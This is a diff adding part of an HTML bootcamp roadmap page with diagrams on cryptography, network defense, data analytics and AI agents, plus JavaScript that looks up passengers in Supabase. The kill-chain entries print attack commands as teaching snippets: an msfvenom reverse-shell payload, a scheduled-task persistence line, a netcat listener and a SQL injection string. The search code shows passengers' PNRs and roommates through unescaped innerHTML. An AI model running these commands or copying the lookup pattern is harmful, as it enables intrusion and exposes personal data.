+                </div>
+
+                <div class="phase-divider"><span>PHASE 2: APPLIED DEFENSE</span></div>
+
+                <div class="step-card bg-crypto" onclick="toggleCard(this, event)">
+                    <div class="step-summary" style="color: #a855f7;">🔐 3. Cryptography</div>
+                    <div class="step-content"><div class="step-content-inner">
+                        <div class="mermaid">
+                            graph TD
+                            classDef default fill:#312e81,stroke:#a855f7,stroke-width:2px,color:#f3e8ff;
+                            Crypto["Cryptography Methods"] --> S["Symmetric: AES"]
+                            Crypto --> A["Asymmetric: RSA"]
+                            Crypto --> H["Hashing: SHA-256"]
+                            click S call showDetails("crypto-symmetric")
+                            click A call showDetails("crypto-asymmetric")
+                            click H call showDetails("crypto-hashing")
+                        </div>
+                    </div></div>
+                </div>
+
+                <div class="step-card bg-defense" onclick="toggleCard(this, event)">
+                    <div class="step-summary" style="color: #f87171;">🛡️ 4. Defensive Architecture</div>
+                    <div class="step-content"><div class="step-content-inner">
+                        <div class="mermaid">
+                            graph TD
+                            classDef default fill:#7f1d1d,stroke:#f87171,stroke-width:2px,color:#fef2f2;
+                            Internet(("Internet")) --> F["Firewall<br/>Bouncer"] --> I["IDS/IPS<br/>Security Cameras"] --> Server["Internal Network<br/>The VIP Lounge"]
+                            F -.-> H["Honeypot<br/>Fake Lounge Trap"]
+                            click F call showDetails("def-firewall")
+                            click I call showDetails("def-ids")
+                            click Server call showDetails("def-server")
+                            click H call showDetails("def-honeypot")
+                        </div>
+                    </div></div>
+                </div>
+
+                <div class="step-card bg-data" onclick="toggleCard(this, event)">
+                    <div class="step-summary" style="color: #14b8a6;">📊 5. Data Analytics</div>
+                    <div class="step-content"><div class="step-content-inner">
+                        <p style="margin-bottom: 20px; color: #e2e8f0;"><strong>Python for Data:</strong> Understand basic data structures (Lists, Dictionaries) and standard libraries. Use <strong>Pandas</strong> for data manipulation (Cleaning/Analysis) and <strong>Matplotlib/Seaborn</strong> for Visualizations. Explore EDA and Looker Studio.</p>
+                        <div class="mermaid">
+                            flowchart LR
+                            classDef default fill:#134e4a,stroke:#14b8a6,stroke-width:2px,color:#ccfbf1;
+                            classDef tool fill:#0f766e,stroke:#2dd4bf,stroke-width:2px,color:#f0fdfa;
+                            
+                            subgraph "Python Ecosystem"
+                                PyData["Lists & Dicts"]:::tool
+                                Pandas["Pandas"]:::tool
+                                Seaborn["Matplotlib/Seaborn"]:::tool
+                            end
+                            
+                            C["Collection"] --> CL["Cleaning"] --> A["Exploratory Data Analysis (EDA)"] --> V["Visualization (Looker Studio)"]
+                            
+                            Pandas -.-> CL
+                            Pandas -.-> A
+                            Seaborn -.-> V
+                            PyData -.-> C
+
+                            click PyData call showDetails("data-py")
+                            click Pandas call showDetails("data-pandas")
+                            click Seaborn call showDetails("data-seaborn")
+                            
+                            click C call showDetails("data-collection")
+                            click CL call showDetails("data-cleaning")
+                            click A call showDetails("data-analysis")
+                            click V call showDetails("data-viz")
+                        </div>
+                    </div></div>
+                </div>
+
+                <div class="phase-divider"><span>PHASE 3: ADVANCED INTELLIGENCE</span></div>
+
+                <div class="step-card bg-agents" onclick="toggleCard(this, event)">
+                    <div class="step-summary" style="color: #8b5cf6;">🤖 6. Building AI Agents</div>
+                    <div class="step-content"><div class="step-content-inner">
+                        <p style="margin-bottom: 20px; color: #e2e8f0;"><strong>The Ultimate Skill:</strong> This is arguably the most cutting-edge part of the program. An "AI Agent" is an AI that doesn't just chat, but uses tools (like calculators, web search, or APIs) to accomplish tasks.</p>
+                        <div class="mermaid">
+                            graph TD
+                            classDef default fill:#4c1d95,stroke:#8b5cf6,stroke-width:2px,color:#ede9fe;
+                            LLM(("LLM Brain")) <--> Tools["Tools: Hands"]
+                            LLM <--> Mem["Memory: Notebook"]
+                            click LLM call showDetails("agent-llm")
+                            click Tools call showDetails("agent-tools")
+                            click Mem call showDetails("agent-memory")
+                        </div>
+                        <div class="mermaid" style="margin-top: 30px;">
+                            graph TD
+                            classDef default fill:#4c1d95,stroke:#8b5cf6,stroke-width:2px,color:#ede9fe;
+                            P["Agent Architectures"] --> Seq["Sequential"]
+                            P --> Rou["Router"]
+                            P --> Loo["Loop / ReAct"]
+                            click Seq call showDetails("agent-seq")
+                            click Rou call showDetails("agent-router")
+                            click Loo call showDetails("agent-loop")
+                        </div>
+                    </div></div>
+                </div>
+
+                <div class="step-card bg-jarvis" onclick="toggleCard(this, event)">
+                    <div class="step-summary" style="color: #fbbf24;">🚀 7. Case Study: J.A.R.V.I.S.</div>
+                    <div class="step-content"><div class="step-content-inner">
+                        <div class="mermaid">
+                            graph TD
+                            classDef default fill:#78350f,stroke:#fbbf24,stroke-width:2px,color:#fef3c7;
+                            User(("User Input")) --> Router["Cascade Semantic Router<br/>(Drawer 6)"]
+                            Router --> RAM[("Anti-Fluff RAM<br/>Supabase")]
+                            Router --> ROM[("Identity Graph ROM<br/>GitHub RAG")]
+                            RAM --> Engine{"Dual-LLM Engine<br/>Gemini / Groq"}
+                            ROM --> Engine
+                            Engine --> Output(("J.A.R.V.I.S. Response"))
+
+                            click Router call showDetails("jarvis-router")
+                            click RAM call showDetails("jarvis-ram")
+                            click ROM call showDetails("jarvis-rom")
+                            click Engine call showDetails("jarvis-engine")
+                        </div>
+                    </div></div>
+                </div>
+
+            </div>
+        </main>
+    </div>
+
+    <!-- JAVASCRIPT LOGIC -->
+    <script>
+        function toggleAccordion() {
+            const content = document.getElementById('travel-content');
+            const icon = document.querySelector('.accordion-header span');
+            if (content.classList.contains('open')) {
+                content.classList.remove('open');
+                icon.innerText = '▼';
+            } else {
+                content.classList.add('open');
+                icon.innerText = '▲';
+            }
+        }
+
+        function toggleCard(cardElement, event) {
+            if (event && event.target.closest('.step-content-inner')) return;
+
+            const isActive = cardElement.classList.contains('active');
+            document.querySelectorAll('.step-card.active').forEach(c => {
+                c.classList.remove('active');
+                setTimeout(() => { c.style.zIndex = '1'; }, 600);
+            });
+
+            if (!isActive) {
+                cardElement.style.zIndex = '100';
+                cardElement.classList.add('active');
+            } else {
+                cardElement.classList.remove('active');
+                setTimeout(() => { cardElement.style.zIndex = '1'; }, 600);
+            }
+        }
+
+        window.nodeData = {
+            'proto-http': { title: 'HTTP/HTTPS', definition: 'The protocol used to transfer web pages. HTTPS uses encryption to secure the data.', usage: 'Browsing websites securely.', code: 'curl -I https://example.com' },
+            'proto-dns': { title: 'DNS (Domain Name System)', definition: 'The phonebook of the internet. Translates human-readable domain names to IP addresses.', usage: 'Resolving google.com to 142.250.190.46', code: 'nslookup google.com' },
+            'proto-tcp': { title: 'TCP/IP Suite', definition: 'The foundational communication protocols. TCP ensures reliable delivery, IP handles routing.', usage: 'Connecting devices across the internet.', code: 'ping 8.8.8.8' },
+            'osi-application': { title: 'Application Layer', definition: 'The layer where the user interacts with the software.', usage: 'Web browsers (HTTP/HTTPS).', code: 'import requests\nr = requests.get("https://google.com")' },
+            'osi-presentation': { title: 'Presentation Layer', definition: 'Handles data encryption.', usage: 'SSL/TLS encryption.', code: 'from cryptography.fernet import Fernet' },
+            'osi-session': { title: 'Session Layer', definition: 'Maintains connections.', usage: 'Keeping an SSH connection alive.', code: 'netstat -an | grep ESTABLISHED' },
+            'osi-transport': { title: 'Transport Layer', definition: 'Transmits data using reliable (TCP) or fast/unreliable (UDP) protocols.', usage: 'TCP for loading web pages.', code: 'import socket' },
+            'osi-network': { title: 'Network Layer', definition: 'Routing using IP addresses.', usage: 'Internet routers.', code: 'traceroute 8.8.8.8' },
+            'osi-datalink': { title: 'Data Link Layer', definition: 'MAC addresses on the local network.', usage: 'Switches.', code: 'arp -a' },
+            'osi-physical': { title: 'Physical Layer', definition: 'Raw bit streams (cables, wifi).', usage: 'Ethernet cables.', code: 'ifconfig -a' },
+            
+            'kc-recon': { title: 'Reconnaissance', definition: 'Gathering intel.', usage: 'Scanning open ports.', code: 'nmap -sV -p- 10.0.0.5' },
+            'kc-weaponize': { title: 'Weaponization', definition: 'Creating the exploit payload.', usage: 'Hiding a RAT in a PDF.', code: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 -f exe > evil.exe' },
+            'kc-delivery': { title: 'Delivery', definition: 'Sending the weapon.', usage: 'Phishing email.', code: 'import smtplib' },
+            'kc-exploit': { title: 'Exploitation', definition: 'Triggering the vulnerability.', usage: 'Buffer overflow.', code: 'SELECT * FROM users WHERE username = \'admin\' OR 1=1 --\'' },
+            'kc-install': { title: 'Installation', definition: 'Establishing persistence.', usage: 'Adding a registry key.', code: 'schtasks /create /tn "WindowsUpdater" /tr "C:\\\\evil.exe" /sc onlogon' },
+            'kc-c2': { title: 'Command & Control', definition: 'Communication channel.', usage: 'Reaching out to attacker server.', code: 'nc -lvnp 4444' },
+            'kc-action': { title: 'Action', definition: 'Final goal.', usage: 'Ransomware encryption.', code: 'tar -czf secret_data.tar.gz /var/www/html' },
+
+            'def-firewall': { title: 'Firewall', definition: 'Monitors traffic.', usage: 'Blocking external IPs.', code: 'sudo ufw deny from 192.168.1.50' },
+            'def-ids': { title: 'IDS / IPS', definition: 'Analyzes traffic for malicious signatures.', usage: 'Snort alerts.', code: 'alert tcp any any -> $HOME_NET 80 (msg:"SQLi");' },
+            'def-server': { title: 'Internal Server', definition: 'Protected assets.', usage: 'Databases.', code: 'chmod 700 /var/secure_data' },
+            'def-honeypot': { title: 'Honeypot', definition: 'Decoy system.', usage: 'Fake server triggering alarms.', code: 'python3 -m http.server 80' },
+
+            'crypto-symmetric': { title: 'Symmetric (AES)', definition: 'One shared key.', usage: 'Local database encryption.', code: 'from cryptography.fernet import Fernet' },
+            'crypto-asymmetric': { title: 'Asymmetric (RSA)', definition: 'Public/Private keys.', usage: 'HTTPS connections.', code: 'from cryptography.hazmat.primitives.asymmetric import rsa' },
+            'crypto-hashing': { title: 'Hashing (SHA)', definition: 'One-way mapping.', usage: 'Storing passwords safely.', code: 'import hashlib\nhashlib.sha256(b"pass")' },
+
+            'data-py': { title: 'Python Structures', definition: 'Lists and Dictionaries.', usage: 'Storing raw data before processing.', code: 'data = {"name": "Alice", "scores": [95, 80]}' },
+            'data-pandas': { title: 'Pandas', definition: 'Standard library for data manipulation.', usage: 'Cleaning and Exploratory Data Analysis (EDA).', code: 'df = pd.DataFrame(data)\ndf.describe()' },
+            'data-seaborn': { title: 'Matplotlib/Seaborn', definition: 'Libraries for data visualization.', usage: 'Creating charts and graphs.', code: 'sns.histplot(df["scores"])' },
+            'data-collection': { title: 'Data Collection', definition: 'Gathering raw data.', usage: 'Loading a dataset.', code: 'import pandas as pd\ndf = pd.read_csv("data.csv")' },
+            'data-cleaning': { title: 'Data Cleaning', definition: 'Fixing or removing bad data.', usage: 'Dropping nulls.', code: 'df_cleaned = df.dropna()' },
+            'data-analysis': { title: 'Exploratory Data Analysis', definition: 'Inspecting data for trends.', usage: 'Finding averages.', code: 'average = df.groupby("type")["days"].mean()' },
+            'data-viz': { title: 'Visualization (Looker Studio)', definition: 'Graphical representation for business intelligence.', usage: 'Interactive dashboards.', code: '# Export for Looker\ndf.to_csv("clean.csv")' },
+
+            'agent-llm': { title: 'The Brain (LLM)', definition: 'Reasoning engine powering the agent.', usage: 'Deciding which tool to use.', code: 'client.chat.completions.create()' },
+            'agent-tools': { title: 'The Hands (Tools)', definition: 'External capabilities the agent can invoke.', usage: 'Calculators, Web Search, APIs.', code: 'def get_weather(city: str):' },
+            'agent-memory': { title: 'The Notebook (Memory)', definition: 'Context and conversation history.', usage: 'Remembering previous steps in a loop.', code: 'memory.append({"role": "user", "content": "Hi"})' },
+            'agent-seq': { title: 'Sequential Pattern', definition: 'Agent A does task, passes to Agent B.', usage: 'Researcher -> Writer.', code: 'writer_agent.run(input=researcher_output)' },
+            'agent-router': { title: 'Router Pattern', definition: 'A Boss agent looks at request and routes to specialist.', usage: 'Math -> Math Agent.', code: 'if intent == "math": math_agent.solve()' },
+            'agent-loop': { title: 'Loop Pattern (ReAct)', definition: 'Reason -> Act -> Observe -> Repeat until goal met.', usage: 'Self-correcting research loop.', code: 'while not goal_achieved: agent.step()' },
+
+            'jarvis-router': { title: 'Cascade Semantic Router', definition: 'A 0-token, two-step routing process.', usage: 'Extracting only necessary JSON nodes.', code: 'if (semantic_match(userText, "academic")) {\n    load_node("academic_vault");\n}' },
+            'jarvis-ram': { title: 'Anti-Fluff Memory Compiler (RAM)', definition: 'Condenses chat history into facts.', usage: 'Writing dynamic memories.', code: 'UPSERT INTO jarvis_known_users (memory_summary) \nVALUES (\'{"new_fact": "Loves Python"}\')' },
+            'jarvis-rom': { title: 'Identity Graph (ROM)', definition: 'Immutable JSON hosted on GitHub.', usage: 'Acting as knowledge base.', code: 'const response = await fetch("https://raw.githubusercontent.com/.../memory.json");\nconst memoryROM = await response.json();' },
+            'jarvis-engine': { title: 'Dual-LLM Engine', definition: 'Execution pipeline fusing RAM/ROM.', usage: 'Robust fallback generation.', code: 'final_prompt = prompt + ROM + RAM\nresponse = call_llm(model="gemini", prompt=final_prompt)' }
+        };
+
+        window.showDetails = function(nodeId) {
+            const data = window.nodeData[nodeId];
+            if (!data) return;
+
+            document.getElementById('panel-title').innerText = data.title;
+            document.getElementById('panel-def').innerText = data.definition;
+            document.getElementById('panel-usage').innerText = data.usage;
+            document.getElementById('panel-code').innerText = data.code;
+            
+            document.getElementById('slide-panel').classList.add('open');
+        };
+
+        document.getElementById('close-panel').addEventListener('click', () => {
+            document.getElementById('slide-panel').classList.remove('open');
+        });
+
+        window.switchTab = function(tabId) {
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            document.querySelector(`.tab-btn[onclick="switchTab('${tabId}')"]`).classList.add('active');
+            document.getElementById(tabId).classList.add('active');
+        };
+
+        // SUPABASE INTEGRATION
+        const supabaseUrl = 'https://nubgiwgeqxvabgkqgevp.supabase.co';
+        const supabaseKey = 'sb_publishable_wH5on2zDbDWFKRU62ptnNQ_8ylODcAI';
+        const sbClient = window.supabase.createClient(supabaseUrl, supabaseKey);
+
+        let activePassengerId = null;
+        let globalFlights = [];
+
+        async function fetchInitialData() {
+            try {
+                const { data: nodes, error: nErr } = await sbClient.from('roadmap_nodes').select('*');
+                if (!nErr && nodes && nodes.length > 0) {
+                    nodes.forEach(n => { window.nodeData[n.id] = n; });
+                }
+                const { data: flights, error: fErr } = await sbClient.from('flights').select('*');
+                if (!fErr && flights) {
+                    globalFlights = flights;
+                }
+                console.log("Supabase: Roadmap nodes and flights fetched successfully.");
+            } catch (e) { console.error("Supabase load error:", e); }
+        }
+        fetchInitialData();
+
+        document.getElementById('search-btn').addEventListener('click', async () => {
+            const query = document.getElementById('passenger-search').value.trim().toUpperCase();
+            if (!query) return;
+            
+            const resultsDiv = document.getElementById('search-results');
+            resultsDiv.style.display = 'block';
+            resultsDiv.innerHTML = 'Searching Database...';
+
+            const { data: passengers, error: pErr } = await sbClient
+                .from('passengers')
+                .select('*, hotel_rooms(*)')
+                .ilike('name', `%${query}%`);
+            
+            if (pErr || !passengers || passengers.length === 0) {
+                resultsDiv.innerHTML = '<span style="color: #ef4444;">No passenger found. Try full name.</span>';
+                return;
+            }
+
+            const pass = passengers[0];
+            activePassengerId = pass.id; // Log in
+            
+            let roommateName = "None";
+            if (pass.hotel_room_id) {
+                const { data: roommates } = await sbClient
+                    .from('passengers')
+                    .select('name')
+                    .eq('hotel_room_id', pass.hotel_room_id)
+                    .neq('id', pass.id);
+                if (roommates && roommates.length > 0) roommateName = roommates[0].name;
+            }
+
+            const completed = pass.completed_nodes || [];
+            document.querySelectorAll('input[type="checkbox"]').forEach(box => {
+                box.checked = completed.includes(box.id);
+                box.parentElement.style.opacity = box.checked ? '0.5' : '1';
+            });
+
+            let flightHtml = '';
+            if (globalFlights.length > 0) {
+                const outFlight = globalFlights.find(f => f.type === 'outbound');
+                const inFlight = globalFlights.find(f => f.type === 'inbound');
+                flightHtml = `
+                    <div style="margin-top: 10px; font-size: 0.9em; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 10px;">
+                        🛫 <strong>Outbound:</strong> ${outFlight.flight_number} | ${outFlight.origin} to ${outFlight.destination} | Dep: ${new Date(outFlight.departure_time).toLocaleString()}<br>
+                        🛬 <strong>Inbound:</strong> ${inFlight.flight_number} | ${inFlight.origin} to ${inFlight.destination} | Dep: ${new Date(inFlight.departure_time).toLocaleString()}
+                    </div>
+                `;
+            }
+
+            resultsDiv.innerHTML = `
+                <div style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 5px;">
+                    <strong style="color: #38bdf8;">${pass.name}</strong> (PNR: ${pass.pnr})<br>
+                    🏨 <strong>Room:</strong> ${pass.hotel_rooms ? pass.hotel_rooms.room_type : 'N/A'}<br>
+                    👯 <strong>Roommate:</strong> <span style="color: #f87171;">${roommateName}</span><br>
+                    ${flightHtml}
+                    ✅ <em>Cloud Progress Synced.</em>
+                </div>
+            `;
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
+            checkboxes.forEach(box => {
+                const savedState = localStorage.getItem('bootcamp_' + box.id);
+                if (savedState === 'true') {
+                    box.checked = true;
+                    box.parentElement.style.opacity = '0.5';
+                }
+                box.addEventListener('change', async (e) => {
+                    // Local Storage Fallback
+                    localStorage.setItem('bootcamp_' + e.target.id, e.target.checked);
+                    e.target.parentElement.style.opacity = e.target.checked ? '0.5' : '1';
+
+                    if (activePassengerId) {
+                        const checkedIds = Array.from(document.querySelectorAll('input[type="checkbox"]:checked')).map(b => b.id);
+                        try {
+                            await sbClient.from('passengers').update({ completed_nodes: checkedIds }).eq('id', activePassengerId);
+                        } catch (err) { console.error("Sync error:", err); }
+                    }
+                });
+            });
+
+            const notesArea = document.getElementById('user-notes');
+            const downloadBtn = document.getElementById('download-btn');
+            const savedNotes = localStorage.getItem('bootcamp_notes');
+            if (savedNotes) notesArea.value = savedNotes;
+
+            notesArea.addEventListener('input', () => localStorage.setItem('bootcamp_notes', notesArea.value));
+
+            downloadBtn.addEventListener('click', () => {
+                const textToSave = notesArea.value;
+                if (!textToSave.trim()) return alert("Your notes are empty! Write something first.");
+                
+                let completedClasses = "\\n\\n--- COMPLETED CLASSES ---\\n";
+                checkboxes.forEach(box => {
+                    if(box.checked) {
+                        const label = box.parentElement.querySelector('.routine-text').innerText.replace('\\n', ': ');
+                        completedClasses += "- " + label + "\\n";
+                    }
+                });
+
+                const blob = new Blob(["=== BOOTCAMP NOTES ===\\n\\n" + textToSave + completedClasses], { type: 'text/plain' });
+                const anchor = document.createElement('a');
+                anchor.download = 'Bootcamp_Notes.txt';
+                anchor.href = window.URL.createObjectURL(blob);
+                anchor.click();
+                window.URL.revokeObjectURL(anchor.href);
+            });
+        });
+    </script>
+
+    <script>
+        // --- SIDEBAR RESIZER ---
+        const resizer = document.getElementById('dragMe');
+        const sidebar = document.querySelector('.sidebar');
+        let isResizing = false;
+
+        if(resizer && sidebar) {
+            resizer.addEventListener('mousedown', (e) => {
+                isResizing = true;
+                resizer.classList.add('active');
+                document.body.style.cursor = 'col-resize';
+            });
+
+            document.addEventListener('mousemove', (e) => {
+                if (!isResizing) return;
+                let newWidth = e.clientX;
+                if (newWidth < 250) newWidth = 250;
+                if (newWidth > 800) newWidth = 800;
+                sidebar.style.width = newWidth + 'px';
+            });
+
+            document.addEventListener('mouseup', () => {
+                if (isResizing) {
+                    isResizing = false;
+                    resizer.classList.remove('active');
+                    document.body.style.cursor = 'default';
+                }
+            });
+        }
+    </script>
+</body>
+</html>
